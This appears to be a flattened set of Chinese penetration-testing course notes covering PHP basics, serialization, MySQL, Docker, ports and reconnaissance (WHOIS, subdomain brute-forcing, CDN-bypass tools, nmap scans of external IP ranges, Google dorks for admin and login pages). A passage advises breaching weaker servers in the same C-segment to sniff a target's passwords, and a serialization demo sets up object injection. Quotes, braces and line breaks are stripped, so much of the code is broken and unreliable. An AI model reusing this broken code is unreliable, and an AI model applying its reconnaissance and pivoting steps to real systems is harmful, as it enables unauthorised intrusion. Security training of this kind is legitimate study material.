//注意：要在当前代码文件所在目录下先去创建一个名为images的文件夹 //保存之前判断该文件是否存在 if(file_exists($filename)) echo 该文件已存在; else //中文名的文件出现问题，所以需要转换编码格式 $filename = iconv(UTF-8,gb2312,$filename); //移动临时文件到上传的文件存放的位置（核心代码） //括号里：1.临时文件的路径, 2.存放的路径 move_uploaded_file($arr[tmp_name],$filename); echo 文件上传成功; else echo 上传的文件大小或类型不符; ? 16，PHP执行系统命令函数systemexec 17 PHP的错误处理17-1 配置项管理在php.ini配置文件中。我们可以控制php的错误显示状态。php.ini中有一个专门的配置项： display_errors 这个选项设置是否将错误信息输出到网页，或者对用户隐藏而不显示。 这个值的状态为on 或者 off，也可以设值为1 或者0。 display_errors的值设为0或者off则不在页面中显示错误，如果设为1或者on则显示错误信息。 问题：如果没有修改服务器php.ini的状态权限怎么办？ 那么可以使用ini_set方法来进行设置。 ?php ini_set(display_errors , 0 ); ? 上面的代码也相当于修改了php.ini中display_errors的值。不过，仅仅在当前php代码中生效。 问题：想取得php.ini的配置项状态怎么办？ 可以使用ini_get(参数项) 得到参数的值。 演示例子： ?php echo 服务器中display_errors的状态为 . ini_get(display_errors);? 注：如果我们修改完php.ini文件中的配置，想让配置生效的话，需要在修改完php.ini文件后重启服务器。 17-2 错误级别 我们介绍一下其中几种： error ## 最严重，必须要解决。不然程序无法继续向下执行warning ## 也很重要。但也必须要解决。如果明确的、故意的可以不用处理。notice ## 你可以不用管。但是在有些公司，项目标准特别高。在高标准要求的项目中也必须要解决。因为，notice ## 会影响到PHP的执行效率。通常发生在函数未定义等。parse ## 错误，是指语法错写错了，必须要解决，代表全部类型的所有错误。 1、 在php.ini中error_reporting参数。如若error_reporting参数设置为0。整个PHP引擎发错误均不会显示、输出、记录。在下一节将要讲的日志记录中，也不会记录。 如果我们想显示所有错误可以写上： error_reporting E_ALL 想要显示所有错误但排除提示，可以将这个参数写为： error_reporting E_ALL ~ E_NOTICE 显示所有错误，但排除提示、兼容性和未来兼容性。可写为： error_reporting ＝ E_ALL ~E_NOTICE ~E_STRICT ~E_DEPRECATED 2、在有些情况下我们无权限操作php.ini文件，又想要控制error_reporting怎么办呢？在运行的 xxxx.php文件中开始处，我们可以使用error_reporting()函数达到目标。 演示代码如下： ?php //关闭了所有的错误显示 error_reporting(0); //显示所有错误 //error_reporting(E_ALL); //显示所有错误，但不显示提示 //error_reporting(E_ALL ~ E_NOTICE);? 17-3 错误记录日志在一些公司里面，有专门的日志收集系统。日志收集系统会在背后默默的帮你收集错误、警告、提示。 也有些公司没有专门的日志收集系统，通过文件来服务器当中的运行日志。 其中：PHP的错误，警告这些是必须要收信的。那么问题来了——不让用户看到，设置好错误报告级别 好，如何将错误收集到日志系统中呢？ 这里有需要使用到php.ini的相关配置项。这两个配置项为 说明： 1.在表格中的log_errors和log_errors_max_len非常好理解。 2.而error_log 指定将错误存在什么路径上。配置项中的syslog可能有点不太好理解。syslog是指系统来记录。windows系统在电脑的日志收集器里面。linux默认在： etcsyslog.conf [扩展] 了解知识点。若Linux系统启动或修改了日志收集。可能存储在第三方专用的日志收集服务器中。 此外，PHP还为我们专门准备了一个自定义的错误日志函数： bool error_log ( string $ 错误消息 [, int $错误消息类型 0 [, string $存储目标]] ) 这个函数可以把错误信息发送到web服务器的错误日志，或者到一个文件里。 常用的错误消息类型： 示例： ?php //无法连接到数据库服务器，直接记录到php.ini 中的error_log指定位置 error_log(无法连接到数据库服务器服务器); //可以发送邮件，但是php.ini必须配置过邮件系统 error_log(可以用邮件报告错误，让运维人员半夜起床干活,1 ,pig@php.cn); //记录在指定的位置 error_log(我是一个错误哟, 3, d:/test/my-errors.log);? web服务应用程序都有自己的日志文件，比如apache的，在phpstudy的安装路径中可以看到。 一般我们手动搭建的apache的默认日志路径是在，重点昂 linux: /etc/httpd/logs/access_logwindows: /Apache/logs/access_log 18，PHP正则表达式preg_match ( string $ 正则 , string $字符串 [, array $结果] ) 功能：根据定界符，比如$ 正则变量，匹配 $字符串变量。如果存在则返回匹配的个数，把匹配到的结果放到$结果变量里。如果没有匹配到结果返回0。 ?php $zz = /wq/; $string = ssssswqaaawqaaa; if(preg_match($zz, $string, $matches)) echo 匹配到了，结果为：; var_dump($matches); else echo 没有匹配到; ? 我们常用的正则函数有 19，反序列化函数19-1 面向对象?phpheader(Content-Type: text/html; charset=utf-8); // 在响应头中添加了content-type: #3 utf-8，header()是php提供的加工响应头键值对的 class Fruit var $name1 = apple; // 定义 属性 var $name2 = orange; function chi() //定义 方法 echo 吃水果.br; echo $this-name1.br; //... function bo() echo 剥皮.br; // 特殊方法，魔法\\魔术方法, 当某个时机到来时，自动执行 function __destruct() //对象销毁时自动执行的方法， __construct 对象创建时自动触发 echo 对象被销毁了.br; $f = new Fruit(); //echo $f-name1.br; // apple $f-chi(); echo 哈哈.br;/* function add() $f = new Fruit(); $f-chi();add();*/? 19-2 序列化和反序列化//序列化,将其他的数据转换成字符串$a = array(one, 33, two);var_dump($a); // array(3) [0]= string(3) one [1]= int(33) [2]= string(3) two echo br; $b = serialize($a);var_dump($b); // string(43) a:3:i:0;s:3:one;i:1;i:33;i:2;s:3:two;//反序列化 将序列化的字符串还原成原来的数据类型$c=unserialize($b);var_dump($c);//类的序列化class S var $name = jaden; function __destruct() echo $this-name; //system(ipconfig); //echo scriptalert(123);/script; function chi() echo xxxxx; $a = new S();echo $a-name.aaaabr;echo $a-chi().br;$b = serialize($a); // O:1:S:1:s:4:name;s:5:jaden;$c = unserialize($b); 20 PHP操作MySQL20-1 创建表# phpstudy的mysql在：C:\\phpStudy\\PHPTutorial\\MySQL\\bin# 注意下面插入数据的时候，不要插入中文数据！！！，因为php连接mysql的编码没有设置，容易乱码。create database jaden charset utf8mb4; create table user(id int NOT NULL AUTO_INCREMENT,username char(20),passwordchar(32),reg_time char(36),PRIMARY KEY (`ID`));insert user(username,password,reg_time)values(admin,123456,CURRENT_TIMESTAMP());insert user(username,password,reg_time)values(wulaoban,123456,CURRENT_TIMESTAMP()); 20-2 查询//连接数据库$db=mysqli_connect(localhost,root,root,jaden, 3306); # 默认端口如果就是3306，那么其实不用写3306$sql=select * from user where username=wulaoban;//$u = wulaoban;//$sql=select * from user where username=$u;//执行sql语句$a=mysqli_query($db,$sql); //遍历数据库的查询结果，while ($row = mysqli_fetch_assoc($a)) //var_dump($row); echo 用户名:.$row[username].,密码:.$row[password]; echo br;mysqli_close($db); 其实php连接mysql有三种方式，phpstudy帮我们都内置了：mysql、mysqli、pdo，其中mysql淘汰了，不安全。 20-3 插入数据$db=mysqli_connect(localhost,root,root,jaden);$sql=insert user(username,password) values(laowang2,111111);$a=mysqli_query($db,$sql);//echo $a.br;if (!$a) echo sql语句语法问题;else echo sql语句执行成功!;mysqli_close($db); 删除数据，更新数据和插入数据步骤类似 21 Cookie和Session登录认证。 只使用cookie location.href=login.php;#设置cookiesetcookie(user,admin);#读取cookie$_COOKIE[user]; 火狐浏览器有个Cookie-Editor插件。 cookie结合session ## 验证的地方： session_start(); isset($_SESSION[user]) ## 登录成功设置： session_start(); $_SESSION[user]=$u; $_SESSION[login_time]=time(); $_SESSION[d]=123; $_SESSION[login_status]=1; // session存放位置：在php.ini配置文件中可以找到，session.save_path 六，docker6-1 docker安装6-1-1 centos 安装docker# centos7上面用yum安装yum install docker -y#启动dockersystemctl start docker#设置开机自启systemctl enable docker#体验docker版nginx最新版docker run -d -p 80:80 nginx#体验docker版nginx 1.16docker run -d -p 81:80 nginx:1.16#体验wordpressdocker run --name mysql -e MYSQL_ROOT_PASSWORD=123456 -d mysql:5.7docker run -d --link mysql:mysql -p 86:80 wordpress:5.6 6-1-2 kaili 安装docker#添加docker的gpg密钥，签名用的curl -fsSL https://mirrors.tuna.tsinghua.edu.cn/docker-ce/linux/debian/gpg | sudo apt-key add -#添加docker的apt源echo deb https://mirrors.tuna.tsinghua.edu.cn/docker-ce/linux/debian/ buster stable | sudo tee /etc/apt/sources.list.d/docker.list#更新apt缓存apt update#安装dockersudo apt-get install docker docker-compose -y或sudo apt-get install docker.io#安装完成之后，docker就自动启动了systemctl status docker #查看docker版本docker -v centos用yum安装，kali上面用apt安装，kali属于debian系列的操作系统。 安装好docker之后，后面不管是centos还是kali，后续docker的操作指令都是一样的。 6-1-3 体验一下docker下载安装运行nginx镜像#体验docker版nginx最新版，本地没有nginx镜像的话，会自动去仓库中拉去镜像并运行docker run -d -p 80:80 nginx#体验docker版的特定版本的nginx 1.16docker run -d -p 81:80 nginx:1.16docker run -d -p 82:80 nginx:1.18#直接浏览器访问：http://192.168.2.121/ 就能看到nginx首页了。在响应数据中就能看到nginx的版本#是不是感受到了安装不同版本nginx的便利之处了，如果不是用docker，你想去安装一些特定的老版本还是比较麻烦的，好多时候只能编译安装#体验wordpress，需要启动两个docker镜像，一个数据库的，一个代码程序，这个比较大，所以速度可能会慢一些docker run --name mysql -e MYSQL_ROOT_PASSWORD=123456 -d mysql:5.7 # 5.7版本的 MySQL，镜像名称是mysqldocker run -d --link mysql:mysql -p 86:80 wordpress:5.6 # 5.6版本的wordpress，最新版本应该已经到了6.x了，但是值得说明的一点就是封装wordpress的人为了将镜像做的比较小，没有安装中文包，所以只能是看英文的了，他会自动连接数据库。如果你发现你安装的镜像不是你要的版本，那么可能是版本指定错误了，或者是官方镜像仓库中的wordpress镜像版本有点问题了。# 可以更改docker镜像库的源cd /etc/docker vim docker.json # 添加如下内容，并保存退出 registry-mirrors: [https://registry.docker-cn.com] # 可以重启docker服务systemctl restart dockersystemctl start dockersystemctl enable dockersystemctl stop docker#Docker中国区官方镜像https://registry.docker-cn.com#阿里云容器，不过这个好像不更新了，大家可以去阿里官方关注一下https://cr.console.aliyun.com/ 6-2 docker镜像常用命令docker search #搜索镜像(只搜索官方仓库的，官方仓库地址：hub.docker.com) # docker search tomcat # docker search apache # 我们拉取的镜像tomcat\\apache等名字很短对吧，这都是官方仓库中的官方镜像，官方仓库中支持用户上传自己封装的镜像，用户镜像和官方镜像的差别在名字上面，比如我们可以去docker官方去注册一个账号，用户自己的镜像前面都会有作者的用户名或者用户所在组织的名字，比如jaden/nginx、jaden/tomcat等。 docker images #查看本地镜像列表，image就是图像、镜像的意思 # 本地有的镜像，就不要再去下载了，而且可以将本地镜像导出来分享给别人 docker pull #下载镜像，拉取镜像 # docker pull tomcat:latest # docker images docker push #上传镜像，推送镜像，推到官方仓库，推送不是那么简单的，不然早就满了，需要在本地登录一下官方账号才能推，后面再演示 docker rmi #删除镜像，rm image的意思，直接rm不加i表示要删除容器，可以通过名称加版本来删除，或者直接通过镜像id值来删除 #docker rmi tomcat:latest 或者 docker rmi imageid值 #可以同时删除多个镜像：docker rmi tomcat:latest tomcat:jre17-temurin-jammy #如果这个镜像处于运行状态的是删除不了的，比如有容器在使用这个镜像，就不能删除镜像，比如docker rmi nginx:1.16会报错 #查看镜像的运行状态 docker container ls，## 其实这是查看容器的状态，但是可以看到哪些镜像被使用了 docker save #导出镜像(压缩包) docker save 镜像名称:版本 -o docker_nginx1.20.tar.gz docker save nginx:1.16 -o docker.nginx1.16.tar.gz#ls 就看到了 docker.nginx1.16.tar.gz docker load #导入镜像 docker load -i docker_nginx1.20.tar.gz，会自动解压并导入到docker服务中 6-3 docker容器的常用指令#docker 常见命令docker run 运行一个新容器docker ps === docker container ls #参数: 默认之显示up状态的容器，-a查看所有容器，或者--alldocker stop 停止容器 #例子 docker stop 容器id或者容器名字docker kill 杀掉容器 #强制关闭容器，尽量不要用，很容易就启动不了了docker start 启动容器 #例子 docker start 容器id或者容器名字docker restart 重启重启 #例子 docker restart 容器id或者容器名字docker rm 删除容器 #例子 docker rm 容器id或者容器名字，同时删除多个，就空格隔开，处于up状态是不能直接删除的，强制删除是可以删除up状态的容器的，docker rm -f 容器名称或者iddocker rm -f `docker ps -a -q` #删除所有容器，-q是只显示容器id，反引号中的指令优先执行docker top 查看容器内的进程 #例子docker top 容器id或者容器名字docker stats 查看容器的资源占用情况docker exec 进入容器 #例子： docker exec -it 容器id或者容器名字 # 直接交互指令：docker exec -it 76738703b7b2 ls # 执行ls指令 # 进入终端：docker exec -it 76738703b7b2 /bin/bash或者/bin/sh #/bin/bash打开一个终端窗口，exit指令退出终端，但是docker容器内容一般不会安装额外的软件，所以导致大量的指令是用不了的，比如ifconfig、ps、ip addr等 docker inspect -f .Name = .NetworkSettings.IPAddress $(docker ps -aq) #可以查看所有容器的ip地址的，容器的ip地址是从`172.17.0.1`开始分的。docker容器类似于一个微型的虚拟机，它占用的都是宿主机(物理机)的资源。在物理机上是可以看到容器所运行的程序的。每个容器都有自己的ip地址。docker inspect --format=.Name - range .NetworkSettings.Networks.IPAddressend $(docker ps -aq) | grep 容器名称或者id# curl -I 加网址，可以看到http响应数据┌──(root㉿jadenkali)-[/home/jaden]└─# curl -I http://172.17.0.4HTTP/1.1 200 OKServer: nginx/1.23.4# netstat -lntup可以看到给docker的端口映射# docker run -d -p 80:80 nginx #-p 80:80，端口映射，表示宿主机的80端口映射到了nginx容器的80端口。 网络结构： docker run参数，有很多参数，最后一个肯定是镜像 -d #放后台运行-p 端口映射 #例子： -p 宿主机端口:容器端口--name 指定容器的名字 # docker run -it --name jaden 镜像id或者名称--link 关联另一个容器 # 了解即可-e MYSQL_ROOT_PASSWORD #设置容器的一些属性，了解一下即可-it #是给运行起来的这个容器分配一个终端，就可以进入到容器内部操作了# 后面想部署什么，直接网上搜索即可。 6-4 制作docker镜像，并上传docker pull debian:latestdocker run -it --name jaden_nginx -p 90:80 debian:latest# 进入容器docker exec -it jaden_debian /bin/bash# 安装nginxapt update # 更新apt缓存apt install nginx -y # 安装nginxnginx -v # 查看nginx版本，安装好了 # ip addr# apt install procps # 安装ps指令# ps -efnginx #启动nginx，systemctl是没有的，没有安装这个指令exit# 打包之前做好先停止容器docker stop jaden_debiandocker commit jaden_nginx syrjaden/debian_nginx:v1 # 根据名字或者id都可以提交，后面加个镜像名称和版本,syrjaden是docker仓库用户名#上传到官方仓库docker login #登录官方仓库#docker tag debian_nginx:v2 syrjaden/debian_nginx:v2 # 这是改名字，如果名称不冲突就不用改名字docker push syrjaden/debian_nginx:v2 # 直接push即可 6-5 docker-composedocker-compose是批量管理docker容器的工具 # 比如前面我们启动的wordpress项目，需要启动两个容器才行，有时候就是这样，需要同时启动多个容器来完成你想要做的事情，但是到底启动多少个容器呢？比如wordpress那个，我们记不住，换一个机器不看笔记很难起来，有了docker-compose就可以解决这个问题了。#centos7安装docker-compose，我们前面已经安装了，不需要再次安装了yum install epel-release.noarch -yyum install docker-compose -y#kali安装docker-composeapt install docker-compose -y# 查看版本docker-compose -v 这里给大家补充个点 systemctl restart docker 重启docker服务会自动关闭所有的容器。 #启动容器的时候，如果加上了--restart=always，那么重启服务之后，这个容器会自动启动docker run -it -d --restart=always nginx:1.16 # 实现了开机自启动的效果 配置文件docker-compose.yml，有了这个配置文件，就可以通过docker-compose来控制多个容器了 # 为了避免端口冲突，我们可以先关闭所有docker容器docker stop `docker ps -a -q`# 为了演示方便，我们可以先创建一个wordpress文件夹，进入到里面创建一个docker-compose.yml名字的文件mkdir wordpresscd wordpress/touch docker-compose.ymlvim docker-compose.yml# 将如下内容拷贝到文件中保存退出，注意拷贝的时候，把里面我标记的注释去掉。# 注意，下面这个文件内容是严格要求格式的，多一个空格都不行，通过缩进来表示等级关系，下面的这种配置语法叫做yaml语法version: 3 # docker-compose.yml的文件格式版本services: db: #容器名称 image: mysql:5.7 restart: always # 开机自启动的意思 environment: MYSQL_ROOT_PASSWORD: 123456 MYSQL_DATABASE: wordpress MYSQL_USER: wordpress MYSQL_PASSWORD: 123456 # 和下面的WORDPRESS_DB_PASSWORD值要对应上 wordpress: depends_on: - db image: wordpress:5.6 ports: - 83:80 # 端口映射 restart: always environment: WORDPRESS_DB_HOST: db WORDPRESS_DB_USER: wordpress WORDPRESS_DB_PASSWORD: 123456 6-5-1 常用docker-compose命令#创建并启动docker-compose up -d # 启动之后就可以通过浏览器访问了#停止并删除docker-compose down#重启docker-compose restart#停止docker-compose stop#启动docker-compose start 七，http协议和抓包7-1 常用端口## 应用层常见的端口和对应传输层协议: HTTP 80 使用TCP DNS 53 使用TCP和UDP HTTPS 443 使用TCP SMB 445 使用TCP TELNET 23 使用TCP FTP 20/21 使用TCP 八，信息收集8-1 域名信息收集8-1 -1 域名信息查询https://whois.chinaz.com/ 其他查询网站 中国万网域名WHOIS信息查询地址：https://whois.aliyun.com/西部数码域名WHOIS信息查询地址：https://whois.west.cn/新网域名WHOIS信息查询地址：http://whois.xinnet.com/domain/whois/index.jsp纳网域名WHOIS信息查询地址：http://whois.nawang.cn/中资源域名WHOIS信息查询地址：https://www.zzy.cn/domain/whois.html三五互联域名WHOIS信息查询地址：https://cp.35.com/chinese/whois.php新网互联域名WHOIS信息查询地址：http://www.dns.com.cn/show/domain/whois/index.do美橙互联域名WHOIS信息查询地址：https://whois.cndns.com/爱名网域名WHOIS信息查询地址：https://www.22.cn/domain/易名网域名WHOIS信息查询地址：https://whois.ename.net/ 8-1-2 SEO信息查询站长之家可以查 8-1-3 子域名收集字典爆破的方式。各种拼接子域名然后访问或者ping探测。 3-1 在线收集子域名https://tool.chinaz.com/subdomain/ https://site.ip138.com/2/domain.htm https://phpinfo.me/domain/ # 属于爆破形式 3-2 子域名收集工具2-1 JSFinder.othttps://github.com/Threezh1/JSFinder# python JSFinder.py -u https://www.mi.com# 安装requests模块: pip install requests pip install bs4 2-2 Layer子域名挖掘机## https://www.webshell.cc/6384.html## 5.0新版：https://pan.baidu.com/s/1wEP_Ysg4qsFbm_k1aoncpg 提取码：uk1j 2-3 subDomainsBrute.pypython .\\subDomainsBrute.py www.baigui.cloud 2-4 oneforall.pypython .\\oneforall.py --target mi.com run 3-3 备案号和ssl证书查询子域名3 -1 域名备案信息查询 3-2 ICP备案号查询https://beian.miit.gov.cn/#/Integrated/recordQuery 有了备案号，可以通过备案号查询这个公司的其他备案的子域名 3-3 ssl证书查询## 查询网址: https://myssl.com/ssl.htmlhttps://www.chinassl.net/ssltools/ssl-checker.html 8-2 收集真实IP地址8-2-1 超级ping站长之家-ping检测 8-2-2 终端ping8-2-3 nslookup(windows)是查询DNS的记录，查看域名解析是否正常，在网络故障的时候用来诊断网络问题的工具，通过它也可以尝试获取一个域名对应的ip地址。 ## 命令格式：nslookup domain[dns-server]## 示例： nslookup wulaoban.top## 还可以指定查询的DNS记录类型命令格式： nslookup -qt=type domain[dns-server]示例： nslookup -qt=CNAME wulaoban.top 8-2-4 digDig是一个在linux命令行模式下查询DNS包括NS记录，A记录，MX记录等相关信息的工具。也能探测到某个域名对应的ip地址。dig 最基本的功能就是查询域名信息，因此它的名称实际上是“域名信息查询工具Domain Information Groper”的缩写。dig 向用户返回的内容可以非常详尽，也可以非常简洁，展现内容的多少完全由用户在查询时使用的选项来决定。 dig wulaoban.top 8-2-5 cdn绕过工具5-1.使用工具绕过，效果不佳## 工具1：fuckcdnhttps://github.com/Tai7sy/fuckcdn## 工具2：w8fuckcdnhttps://github.com/boy-hack/w8fuckcdn 5-2.历史DNS解析这种历史记录查询，有可能能够找到它没有使用cdn之前的真实ip地址 https://x.threatbook.com/v5/domain/wulaoban.tophttps://dnsdb.io/zh-cn/ ###DNS查询https://x.threatbook.cn/ ###微步在线http://toolbar.netcraft.com/site_report?url=www.wulaoban.top ###在线域名信息查询http://viewdns.info/ ###DNS、IP等查询https://tools.ipip.net/cdn.php ###CDN查询IPhttps://securitytrails.com/domain/wulaoban.top/dns 8-3 旁站和C段IP旁站：一般是指的是同ip，也就是同服务器下的不同站点，比如我们前面使用IIS部署了多个网站在同一个ip下。 什么是C段：比如在：127.127.127.4 这个IP上面有一个网站 127.4 这个服务器上面有网站我们可以想想..他是一个非常大的站几乎没什么漏洞！但是在他同C段 127.127.127.1127.127.127.255 这 1255 上面也有服务器而且也有网站并且存在漏洞,那么我们就可以来渗透 1~255任何一个站 之后提权来嗅探得到127.4 这台服务器的密码 甚至3389连接的密码后台登录的密码 如果运气好会得到很多的密码… 8-3-1 IISPutScanner8-3-2 常用端口ftp 21ssh\\sftp 22telnet 23 # 很多交换机、路由器会用到telnet来进行管理，主要是用来做远程主机管理的smtp 25 # 发邮件pop3 110 # 收邮件dns 53smb 445 # 微软的文件共享，netstat -an -p tcp|findstr LISTENING windows必开，139端口也是windows做共享的https 443http 80apache 80 443nginx 80 443tomcat 8080weblogic 7001mysql 3306mssql 1433oracle 1521postgresql 5432redis 6379mongdb 27017vnc 5900 # 远程控制工具IIS 80jboss 8080rdp == remote desktop protocol 3389 8-4 收集端口和服务1，nmap扫描NMAP的功能包括： ## 主机发现 - 识别网络上的主机。例如，列出响应TCP和/或ICMP请求或打开特定端口的主机。## 端口扫描 - 枚举目标主机上的开放端口。## 版本检测 - 询问远程设备上的网络服务以确定应用程序名称和版本号。## OS检测 - 确定网络设备的操作系统和硬件特性。## 可与脚本进行脚本交互 - 使用Nmap脚本引擎（NSE）和Lua编程语言。## 漏洞检测 NMAP可以提供有关目标的更多信息，包括反向DNS名称，设备类型和MAC地址.Nmap的典型用途： #3 通过识别可以进行的或通过它的网络连接来审计设备或防火墙的安全性。## 识别目标主机上的开放端口以准备审计。## 网络库存，网络映射，维护和资产管理。## 通过识别新服务器来审计网络的安全性。## 为网络上的主机生成流量。 1 主机发现主机发现的原理与Ping命令类似，但是手段不限于ping，发送探测包到目标主机，如果收到回复，那么说明目标主机是开启的。Nmap支持十多种不同的主机探测方式，比如发送ICMP 的ECHOTIMESTAMPNETMASK报文、发送TCP的SYNACK包、发送SCTP的 INITCOOKIE-ECHO包，用户可以在不同的条件下灵活选用不同的方式来探测目标机。 nmap语法 Nmap 扫描选项 扫描目标 基本用法 -sL: List Scan 列表扫描，仅将指定的目标的IP列举出来，不进行主机发现。-sn: Ping Scan 只进行主机发现，不进行端口扫描。-Pn: 将所有指定的主机视作开启的，跳过主机发现的过程。-PS/PA/PU/PY[portlist]: 使用TCPSYN/ACK或SCTP INIT/ECHO方式进行发现。-PE/PP/PM: 使用ICMP echo, timestamp, and netmask 请求包发现主机。-PO[protocollist]: 使用IP协议包探测对方主机是否开启。-n/-R: -n表示不进行DNS解析；-R表示总是进行DNS解析。--dns-servers serv1[,serv2],...: 指定DNS服务器。--system-dns: 指定使用系统的DNS服务器--traceroute: 追踪每个路由节点 案例演示 nmap –sn 192.168.18.1-100 ## 扫描局域网192.168.18.1-192.168.18.100范围内哪些IP的主机是活动的。nmap –sn 152.136.221.1-200 ## 扫描外网152.136.221.1-200范围内哪些ip的主机是活动的nmap –P0 152.136.221.1-200 ## 无ping扫描 由图可知：好多台主机处于存活状态。 2，端口扫描端口扫描是Nmap最基本最核心的功能，用于确定目标主机的TCPUDP端口的开放情况。默认情况下，Nmap会扫描1000个最有可能开放的TCP端口。Nmap通过探测将端口划分为6个状态： open： ## 端口是开放的。closed：## 端口是关闭的。filtered：## 端口被防火墙IDS/IPS屏蔽，无法确定其状态。unfiltered：## 端口没有被屏蔽，但是否开放需要进一步确定。open|filtered：## 端口是开放的或被屏蔽。closed|filtered ：## 端口是关闭的或被屏蔽。 端口扫描方面非常强大，提供了很多的探测方式： ## TCP SYN scanning## TCP connect scanning## TCP ACK scanning## TCP FIN/Xmas/NULL scanning## UDP scanning 分类] ## 开放扫描：会产生大量的审计数据，容易被对方发现，但其可靠性高；例如：TCP Connect类。 效率## 隐蔽扫描：能有效的避免入侵检测系统和防火墙的检测，但扫描使数据包容易被丢弃从而产生错误的探测信息；例如：TCP FIN类。 效率低## 半开放扫描：隐蔽性和可靠性介于前两者之间。例如：TCP SYN类。 基本用法 -sS/sT/sA/sW/sM: ## 指定使用 TCP SYN/Connect()/ACK/Window/Maimon scans的方式来对目标主机进行扫描。-sU: ## 指定使用UDP扫描方式确定目标主机的UDP端口状况。-sN/sF/sX: ## 指定使用TCP Null, FIN, and Xmas scans秘密扫描方式来协助探测对方的TCP端口状态。--scanflags flags: ## 定制TCP包的flags。-sI zombiehost[:probeport]: ## 指定使用idle scan方式来扫描目标主机（前提需要找到合适的zombie host）-sY/sZ: ## 使用SCTP INIT/COOKIE-ECHO来扫描SCTP协议端口的开放的情况。-sO: ## 使用IP protocol 扫描确定目标机支持的协议类型。-b FTP relay host: ## 使用FTP bounce scan扫描方式 常见参数描述 其他参数 -p port ranges ## 只扫描指定端口eg：-p22; -p1-65535; -p U:53,111,137,T:21-25,80,139,8080,S:9-F ## 扫描比默认扫描更少的端口--top-posts number ## 扫描number数量的最常见的端 使用演示 在此，我们以局域网中的主机192.168.0.22为例。命令如下： nmap -sS -sU -T4 -top-ports 300 192.168.0.22 内网nmap -sS -sU -T4 -top-ports 300 152.136.221.160 外网 参数 -sS ## 表示使用TCP SYN方式扫描TCP端口；-sU ## 表示扫描UDP端口；-T4 ## 表示时间级别配置4级；--top-ports ## 300表示扫描最有可能开放的300个端口（TCP和UDP分别有300个端口） -T参数说明： ## -T参数，优化时间控制选项的功能很强大也很有效但是有些用户会被迷惑。此外往往选择合适参数的时间超过了所需优化的扫描时间。因此Nmap提供了一些简单的方法使用6个时间模板使用时采用-T选项及数字（0~5）或名称。模板名称有paranoid(0)、sneaky(1)、polite(2)、normal(3)、aggressive(4)、insane(5)## paranoid、sneaky模式用于IDS躲避，IDS是入侵检测系统（intrusion detection system，简称“IDS”）是一种对网络传输进行即时监视，在发现可疑传输时发出警报或者采取主动反应措施的网络安全设备## polite模式降低了扫描速度及使用更少的带宽和目标主机资源## normal为默认模式因此-T3实际上未作任何优化## aggressive模式假设用户具有合适及可靠的网络从而加速扫描## insane模式假设用户具有特别快的网络或者愿意为获得速度而牺牲准确性 内网虚拟机的效果 这个主机开放了5357端口。 外部网址效果 C段端口扫描 nmap -p 80,443,8000,8080 -Pn 152.136.221.120/200-Pn: 指定ip地址段 效果： 为什么要扫描端口呢？可以查询端口对应的一些漏洞进行渗透。 找到漏洞列表再去搜索对应的漏洞详细使用过程。 11种状态 3，版本侦测简要的介绍版本的侦测原理。版本侦测主要分为以下几个步骤 ## 1. 首先检查open与open|filtered状态的端口是否在排除端口列表内。如果在排除列表，将该端口剔除。## 2. 如果是TCP端口，尝试建立TCP连接。尝试等待片刻（通常6秒或更多，具体时间可以查询文件nmap\u0002services-probes中Probe TCP NULL q||对应的totalwaitms）。通常在等待时间内，会接收到目标机发送的“WelcomeBanner”信息。nmap将接收到的Banner与nmap-services-probes中NULL probe中的签名进行对比。查找对应应用程序的名字与版本信息。## 3. 如果通过“Welcome Banner”无法确定应用程序版本，那么nmap再尝试发送其他的探测包（即从nmap\u0002services-probes中挑选合适的probe），将probe得到回复包与数据库中的签名进行对比。如果反复探测都无法得出具体应用，那么打印出应用返回报文，让用户自行进一步判定。## 4. 如果是UDP端口，那么直接使用nmap-services-probes中探测包进行探测匹配。根据结果对比分析出UDP应用服务类型。## 5. 如果探测到应用程序是SSL，那么调用openSSL进一步的侦查运行在SSL之上的具体的应用类型。## 6. 如果探测到应用程序是SunRPC，那么调用brute-force RPC grinder进一步探测具体服务。 基本用法 -sV: 指定让Nmap进行版本侦测 --version-intensity level: 指定版本侦测强度（0-9），默认为7。数值越高，探测出的服务越准确，但是运行时间会比较长。--version-light: 指定使用轻量侦测方式 (intensity 2) --version-all: 尝试使用所有的probes进行侦测 (intensity 9) --version-trace: 显示出详细的版本侦测过程信息。 使用演示 对主机152.136.221.160 进行版本侦测。 nmap -sV 152.136.221.161 4，漏洞扫描nmap的漏洞库其实很小，没有多少能扫出来的漏洞，但是它也提供了漏洞扫描功能，我们一般用专业的漏洞扫描工具来扫描。所以简单说一下nmap的漏洞扫描功能，知道即可。 基本用法 nmap 目标(ip地址) --script=auth,vuln # 常见的一些漏洞扫描 使用演示 用我的一台虚拟机做演示：192.168.0.15 nmap 192.168.0.15 --script=auth,vuln 8-5 收集网站指纹信息指纹工具 ，在线网站 8-6 收集敏感信息1，目录信息收集## 7kbscan工具检测 2，代买管理平台代码泄漏## Git导致文件泄露## DS_store导致文件泄露## SVN导致文件泄露 8-7 信息收集综合利用工具1，Google hack高级收集Google搜索引擎之所以强大，关键在于它详细的搜索关键词，以下是几个常用的搜索关键词：（更多详细教程，参见http://user.qzone.qq.com/568311803/main） inurl: ## 用于查找含有该值的所有url网址网页。例：inurl:mail（可找一些免费邮箱）related:：## 找出和该网址类似的网站，比如想知道和amazon.com类似的大型网络书店有哪些时输入amazon.com网址。例：related:amazon.comintext: ## 只搜索网页部分中包含的文字(也就是忽略了标题,URL等的文字).filetype: ## 搜索通过文件的后缀或者扩展名来搜索含有这类文件的网页intitle: ## 标题中存在关键字的网页allintitle: ## 搜索所有关键字构成标题的网页. 但是推荐不要使用link: ### 可以得到一个所有包含了某个指定URL的页面列表. 当我们使用link:URL提交查询的时候，Google会返回跟此URL做了链接的网站。例 ［link:www.baidu.com］，提交这个查询，我们将得到所有跟www.baidu.com这个网站做了链接的网站。（link是个单独的语 法，只能单独使用，且后面不能跟查询关键词，跟能跟URL）location: ## 当我们提交location进行Google新闻查询的时候，Google仅会返回你当前指定区的跟查询关键词相关的网页。例[ queen location:canada ]，提交这个查询，Google会返回加拿大的跟查询关键词”queen”相匹配的网站。site: ## 搜索含有该域名的网页，google会限制尽在某个网站或者说域下面进行搜索## 使用site进行站点搜索时，一般常见用法有：site:ooxx.com filetype:xls # 支持组合搜索site:xxx.com admin # 一般公司的后台系统都带有admin啊，login啊，内部系统啊之类的关键字site:xxx.xxx login site:xxx.xxx systemsite:xxx.xxx 管理site:xxx.xxx 登录site:xxx.xxx 内部site:xxx.xxx 系统site:xxx.xxx 邮件site:xxx.xxx emailsite:xxx.xxx qqsite:xxx.xxx 群site:xxx.xxx 企鹅site:xxx.xxx 